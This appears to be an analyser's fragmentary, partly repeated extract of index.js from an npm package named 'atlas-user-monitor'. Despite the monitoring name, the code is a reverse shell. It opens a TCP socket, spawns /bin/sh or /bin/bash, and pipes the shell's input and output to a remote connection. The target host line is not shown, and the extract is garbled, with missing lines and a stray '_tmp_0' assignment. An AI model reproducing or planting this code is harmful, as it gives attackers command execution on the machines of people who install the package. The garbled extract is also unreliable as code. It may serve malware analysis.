// File: tmp/tmpw97uz83m/atlas-user-monitor/package/index.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 2: const net = require('net')
Line 7: const client = new net.Socket()
Line 9: {
    console.log('Connected to the target IP and port');

    // Try different shell paths
    const shells = ['/bin/sh', '/bin/bash', '/usr/bin/sh', '/usr/bin/bash'];
    let sh;

    for (const shell of shells) {
        sh = exec(shell, (error, stdout, stderr) => {
            if (error) {
                console.error(`exec error: ${error}`);
                return;
            }
            console.log(`stdout: ${stdout}`);
            console.error(`stderr: ${stderr}`);
        });

        if (sh) {
            break;
        }
    }

    if (sh) {
        client.write('Connected to the target IP and port\n');

        sh.stdout.pipe(client);
        sh.stderr.pipe(client);

        client.pipe(sh.stdin);
    } else {
        console.error('No valid shell found');
    }
}
Line 13: const shells = ['/bin/sh', '/bin/bash', '/usr/bin/sh', '/usr/bin/bash']
Line 16: for (const shell of shells) {
        sh = exec(shell, (error, stdout, stderr) => {
            if (error) {
                console.error(`exec error: ${error}`);
                return;
            }
            console.log(`stdout: ${stdout}`);
            console.error(`stderr: ${stderr}`);
        });

        if (sh) {
            break;
        }
    }
Line 17: sh = exec(shell, (error, stdout, stderr) => {
            if (error) {
                console.error(`exec error: ${error}`);
                return;
            }
            console.log(`stdout: ${stdout}`);
            console.error(`stderr: ${stderr}`);
        })
Line 31: {
        client.write('Connected to the target IP and port\n');

        sh.stdout.pipe(client);
        sh.stderr.pipe(client);

        client.pipe(sh.stdin);
    }
Line 32: client.write('Connected to the target IP and port\n')
Line 34: sh.stdout.pipe(client)
Line 35: sh.stderr.pipe(client)
Line 37: client.pipe(sh.stdin)
